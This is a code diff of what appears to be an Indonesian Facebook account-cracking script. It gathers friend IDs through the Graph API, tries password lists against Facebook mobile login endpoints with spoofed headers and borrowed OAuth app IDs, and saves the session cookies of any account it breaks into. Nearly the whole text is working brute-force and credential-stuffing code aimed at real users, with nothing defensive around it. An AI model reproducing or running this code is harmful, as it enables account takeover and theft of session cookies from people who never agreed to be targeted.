@@ -21,7 +21,6 @@ import requests, sys, time, re, random, base64, json, uuid
 from concurrent.futures import ThreadPoolExecutor as Modol
 from rich.progress import Progress, TextColumn
 from bs4 import BeautifulSoup as par
-from time import time as digidaw
 from rich import print as prints
 from rich.panel import Panel
 from rich.tree import Tree
@@ -201,7 +200,7 @@ N,H,N
                     mnh +=1
                     user = input(f"[{O}*{N}] masukan id ke {mnh}: ")
                     try:
-                        tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}",cookies=cook).json()
+                        tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={tokz}",cookies=cook).json()
                         for x in tol["friends"]["data"]:
                             self.id.append(x["id"]+"<=>"+x["name"])
                     except KeyError:
@@ -213,7 +212,7 @@ N,H,N
                 print("[+] ketik 'me' jika ingin crack dari teman anda.")
                 user = input(f"[{O}*{N}] masukan id: ")
                 try:
-                    tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}",cookies=cook).json()
+                    tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={tokz}",cookies=cook).json()
                     for x in tol["friends"]["data"]:
                         self.id.append(x["id"]+"<=>"+x["name"])
                         titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
@@ -459,9 +458,9 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         return rc([f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,10))}_{str(rr(0,6))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(90,114))}.0.{str(rr(5000,5555))}.{str(rr(131,135))} Mobile/15E148 Safari/604.1"])
 
     def ua_asu(self):
-        rr = random.randint
-        rc = random.choice
-        return rc([f"Mozilla/5.0 Linux; Android 14; Nokia X10) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/{str(rr(60,114))}.0 Brave Chrome/{str(rr(60,114))}.0.{str(rr(4000,9999))}.{str(rr(131,135))} Safari/537.36 YouTube/1.96.58.J KaiOS"])
+        #rr = random.randint
+        #rc = random.choice
+        return "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
 
     def cek_apk(self, user, pw, coki):
         try:
@@ -567,59 +566,57 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         for password in pasw:
             try:
                 rr = random.randint
-                rc = random.choice
-                #user, pasa = "100089133853100|putrabroiler".split("|")
                 uas = self.ua_asu()
                 ses = requests.Session()
-                request = rc(['XMLHttpRequest','com.android.chrome','mark.via.gp','com.mi.globalbrowser.mini','dassem.websiteanalyzer'])
-                tema = rc(['dark','light'])
-                bahasa = rc(['en-GB,en-US;q=0.9,en;q=0.8','id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','en-US;q=0.8,en;q=0.7','id,en-US;q=0.9,en;q=0.8','en-US;q=0.8,en;q=0.7'])
-                link = ses.get("https://p.facebook.com/login.php?skip_api_login=1&api_key=635765408705643&kid_directed_site=0&app_id=635765408705643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+                link = ses.get('https://x.facebook.com/login.php?skip_api_login=1&api_key=344107675684331&kid_directed_site=0&app_id=344107675684331&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.1%2Fdialog%2Foauth%3Fapp_id%3D344107675684331%26cbt%3D1690681903263%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1df963a6b5854%2526domain%253Did-id.soccermanager.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid-id.soccermanager.com%25252Ff2b0206cf592c6%2526relation%253Dopener%26client_id%3D344107675684331%26display%3Dtouch%26domain%3Did-id.soccermanager.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid-id.soccermanager.com%252Flogin.php%26locale%3Did_ID%26logger_id%3Df327a6cc180392c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df287916a688c5f8%2526domain%253Did-id.soccermanager.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid-id.soccermanager.com%25252Ff2b0206cf592c6%2526relation%253Dopener%2526frame%253Df1bfd7c0149d948%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.1%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df287916a688c5f8%26domain%3Did-id.soccermanager.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid-id.soccermanager.com%252Ff2b0206cf592c6%26relation%3Dopener%26frame%3Df1bfd7c0149d948%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                 data = {
-                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
-                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
-                    "try_number": "0",
-                    "unrecognized_tries": "0",
-                    "email": username,
-                    "prefill_contact_point": f"{username} {password}",
-                    "prefill_source": "browser_dropdown",
-                    "prefill_type": "password",
-                    "first_prefill_source": "browser_dropdown",
-                    "first_prefill_type": "contact_point",
-                    "had_cp_prefilled": True,
-                    "had_password_prefilled": True,
-                    "is_smart_lock": False,
-                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
-                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-                    "encpass": f"#PWD_BROWSER:0:{str(digidaw()).split('.')[0]}:{password}",
-                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
-                headers = {
-                    'Host': 'p.facebook.com',
-                    'content-length': f'{str(len(data))}',
-                    'sec-ch-ua': f'"Chromium";v="{str(rr(89,116))}", "Not)A;Brand";v="{str(rr(24,98))}", "Google Chrome";v="116"',
-                    'sec-ch-ua-mobile': '?1',
-                    'user-agent': uas,
-                    'x-response-format': 'JSONStream',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-                    'viewport-width': f'{str(rr(50,5000))}',
-                    'sec-ch-ua-platform-version': f'"{str(rr(7,13))}.1.1"',
-                    'x-requested-with': request,
-                    'x-asbd-id': f'{str(rr(129477,2000000))}',
-                    'dpr': '1.5',
-                    'sec-ch-ua-full-version-list': f'"Chromium";v="{str(rr(116,3000))}.0.{str(rr(5845,60000))}.{str(rr(50,3000))}", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="{str(rr(116,3000))}.0.{str(rr(5845,60000))}.{str(rr(50,3000))}"',
-                    'sec-ch-prefers-color-scheme': tema,
-                    'sec-ch-ua-platform': '"Android"',
-                    'accept': '*/*',
-                    'origin': 'https://p.facebook.com',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-dest': 'empty',
-                    'referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=635765408705643&kid_directed_site=0&app_id=635765408705643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'accept-language': bahasa}
-                post = ses.post("https://p.facebook.com/login/device-based/login/async/?api_key=635765408705643&auth_token=3f4035c79708a5d0feef878c0ec25ca8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&refsrc=deprecated&app_id=635765408705643&cancel=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&lwv=100",data= data, headers= headers, allow_redirects=False)
+				"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+				"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+				"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
+				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
+				"email": username,
+				"prefill_contact_point": "",
+				"prefill_source": "",
+				"prefill_type": "",
+				"first_prefill_source": "",
+				"first_prefill_type": "",
+				"had_cp_prefilled": "false",
+				"had_password_prefilled": "true",
+				"is_smart_lock": "true",
+				"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
+				"pass": password,
+				"jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+				"lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+				"__dyn": "",
+				"__csr": "",
+				"__a": "",
+				"user": "0",
+				"_fb_noscript": "true"}
+                head = {
+				"Host": "x.facebook.com",
+				"content-length": str(rr(2000,2199)),
+				"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
+				"sec-ch-ua-mobile": "?1",
+				"user-agent": uas,
+				"viewport-width": "557",
+				"content-type": "application/x-www-form-urlencoded",
+				"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+				"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
+				"x-asbd-id": "129477",
+				"dpr": "1.29325",
+				"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+				"sec-ch-ua-model": '"RMX3171"',
+				"sec-ch-prefers-color-scheme": "dark",
+				"sec-ch-ua-platform": '"Android"',
+				"accept": "*/*",
+				"origin": "https://x.facebook.com",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-dest": "empty",
+				"referer": "https://x.facebook.com/login.php?skip_api_login=1&api_key=482432758546335&kid_directed_site=0&app_id=482432758546335&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D482432758546335%26redirect_uri%3Dhttps%253A%252F%252Fapi.netdrive.net%252Faccounts%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%26response_type%3Dcode%26state%3D9imBv9D0gm6z%26auth_type%3Dreauthenticate%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1716d8aa-5ea4-45ad-9c36-ff6534ffb5cf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.netdrive.net%2Faccounts%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D9imBv9D0gm6z%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+                post = ses.post(f"https://x.facebook.com/login/device-based/login/async/?api_key=482432758546335&auth_token=9a0dd463ee2801379b53fff8c630db87&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D482432758546335%26redirect_uri%3Dhttps%253A%252F%252Fapi.netdrive.net%252Faccounts%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%26response_type%3Dcode%26state%3D9imBv9D0gm6z%26auth_type%3Dreauthenticate%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1716d8aa-5ea4-45ad-9c36-ff6534ffb5cf%26tp%3Dunspecified&refsrc=deprecated&app_id=482432758546335&cancel=https%3A%2F%2Fapi.netdrive.net%2Faccounts%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D9imBv9D0gm6z%23_%3D_&lwv=100",data=data,headers=head,allow_redirects=False)
 
                 if "c_user" in ses.cookies.get_dict():
                     cooz = ses.cookies.get_dict()
@@ -737,27 +734,10 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
             try:
                 ses=requests.Session()
                 uas = self.ua_asu()
-                link = ses.get(f"https://mtouch.prod.facebook.com/login/device-based/password/?uid={username}&flow=login_no_pin&refsrc=deprecated&locale2=en_GB&_rdr")
-                data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": username,"next": "https://mtouch.prod.facebook.com/login/save-device/","flow":"login_no_pin","pass": password}
-                headd = {
-                    "Host": "mtouch.prod.facebook.com",
-                    "Connection": "keep-alive",
-                    "Content-Length": "334",
-                    "Cache-Control": "max-age=0",
-                    "Upgrade-Insecure-Requests": "1",
-                    "Origin": "https://+url",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "User-Agent": uas,
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "X-Requested-With": "hot.fiery.browser",
-                    "Sec-Fetch-Site": "same-origin",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-User": "?1",
-                    "Sec-Fetch-Dest": "document",
-                    "Referer": link.url,
-                    "Accept-Encoding": "gzip, deflate",
-                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-                post = ses.post("https://mtouch.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_GB", data=data,headers=headd,allow_redirects=False)
+                head = {"Host": "m.facebook.com","content-length": "263","cache-control": "max-age=0",'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"upgrade-insecure-requests": '"1"',"origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+                getlog = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={username}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                idpass ={'lsd': re.search('name="lsd" value="(.*?)"',str(getlog.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(getlog.text)).group(1),'uid': username,'next': '','flow': 'login_no_pin','pass': password}
+                ses.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                 if "c_user" in ses.cookies.get_dict():
                     cooz = ses.cookies.get_dict()
                     coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
